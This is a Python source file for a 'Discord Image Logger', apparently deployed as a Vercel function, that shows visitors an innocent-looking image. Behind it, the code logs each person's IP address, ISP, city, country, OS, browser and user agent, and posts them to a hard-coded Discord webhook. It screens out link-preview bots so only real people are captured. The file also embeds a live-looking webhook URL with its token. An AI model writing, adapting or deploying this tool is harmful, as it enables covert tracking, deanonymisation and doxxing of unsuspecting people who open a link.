# Discord Image Logger - Vercel Optimized
from urllib import parse
import requests, base64, httpagentparser, json, traceback

__app__ = "Discord Image Logger"
__version__ = "v2.0"

# ========== CONFIGURATION ==========
config = {
    "webhook": "https://discord.com/api/webhooks/1542880876910739576/xkzlVRqk8escogXognrP8_2mosBHTSedVearzrntiqiF_Xv3FovqjdPQlsxPRZdKKqTU",
    "image": "https://i.pinimg.com/474x/df/96/d8/df96d84e03317bba5b9961e75382ec37.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {"doMessage": False, "message": "", "richMessage": True},
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {"redirect": False, "page": ""}
}

blacklistedIPs = ("27", "104", "143", "164")

# ========== CORE FUNCTIONS ==========
def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def makeReport(ip, useragent=None, endpoint="N/A", url=None):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "embeds": [{
                        "title": "Link Sent",
                        "color": config["color"],
                        "description": f"IP: `{ip}` | Platform: `{bot}`"
                    }]
                }, timeout=3)
            except: pass
        return

    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=3).json()
    except:
        info = {"isp":"Unknown","as":"Unknown","country":"Unknown","regionName":"Unknown","city":"Unknown","lat":0,"lon":0,"timezone":"UTC","mobile":False,"proxy":False,"hosting":False}

    if info.get("proxy"):
        if config["vpnCheck"] == 2: return
        if config["vpnCheck"] == 1: ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 4 and not info.get("proxy"): return
        if config["antiBot"] == 3: return
        if config["antiBot"] == 2 and not info.get("proxy"): ping = ""
        if config["antiBot"] == 1: ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "IP Logged",
            "color": config["color"],
            "description": f"""**IP:** `{ip}`
**Provider:** {info.get('isp','Unknown')}
**Country:** {info.get('country','Unknown')}
**City:** {info.get('city','Unknown')}
**OS:** {os}
**Browser:** {browser}
**VPN:** {info.get('proxy',False)}
**Bot:** {info.get('hosting',False)}
**User Agent:** `{useragent}`"""
        }]
    }
    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}
    
    try:
        requests.post(config["webhook"], json=embed, timeout=3)
    except: pass
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

# ========== VERCEL HANDLER ==========
def handler(request):
    try:
        ip = request.headers.get('x-forwarded-for', '').split(',')[0].strip()
        useragent = request.headers.get('user-agent', '')
        path = request.path
        query = request.query_string.decode() if hasattr(request.query_string, 'decode') else request.query_string

        # Get image URL
        url = config["image"]
        if config["imageArgument"] and query:
            try:
                dic = dict(parse.parse_qsl(query))
                if dic.get("url"):
                    url = base64.b64decode(dic.get("url").encode()).decode()
            except: pass

        # Log the visit
        makeReport(ip, useragent, endpoint=path, url=url)

        # Return image
        return {
            "statusCode": 200,
            "headers": {"Content-Type": "text/html"},
            "body": f'<html><body><img src="{url}" style="width:100vw;height:100vh;object-fit:contain;"></body></html>'
        }
    except Exception as e:
        return {
            "statusCode": 500,
            "body": f"<html><body><h1>Error</h1><p>{str(e)}</p></body></html>"
        }
